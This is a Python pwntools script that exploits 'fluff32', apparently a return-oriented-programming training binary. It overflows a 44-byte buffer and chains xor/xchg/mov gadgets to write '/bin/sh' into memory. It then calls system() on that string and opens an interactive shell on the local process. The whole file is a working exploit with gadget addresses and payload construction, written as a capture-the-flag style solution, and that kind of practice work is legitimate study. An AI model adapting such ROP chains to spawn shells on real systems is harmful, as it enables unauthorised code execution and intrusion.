from pwn import *
context.log_level="debug"
e = ELF("./fluff32")
system = p32(e.symbols["system"])
data = 0x0804a028

# 0x08048671 : xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret                                              edx = 0
# 0x080483e1 : pop ebx ; ret                                                                                   ebx = xxxx
# 0x0804867b : xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret                                              edx = edx ^ ebx == (edx = xxxx)
# 0x08048689 : xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret                                             ecx = edx
# 0x08048693 : mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret
xor_edx_edx = p32(0x08048671)
pop_ebx = p32(0x080483e1)
xor_edx_ebx = p32(0x0804867b)
xchg_edx_ecx = p32(0x08048689)
mov_ecx_edx = p32(0x08048693)

def write_sh(string, data_addr):
    # ecx <- data
    payload = xor_edx_edx
    payload += "b"*4
    payload += pop_ebx
    payload += p32(data_addr)
    payload += xor_edx_ebx
    payload += "b"*4
    payload += xchg_edx_ecx
    payload += "b"*4
    # edx <- string
    payload += xor_edx_edx
    payload += "b"*4
    payload += pop_ebx
    payload += string
    payload += xor_edx_ebx
    payload += "b"*4
    # [ecx] <- edx
    payload += mov_ecx_edx
    payload += "b"*4
    payload += p32(0)
    return payload

payload = "a"*44
payload += write_sh("/bin", data)
payload += write_sh("/sh\x00", data+4)
payload += system
payload += "b"*4
payload += p32(data)

p = process("./fluff32")
print p.recv()
p.sendline(payload)
p.interactive()


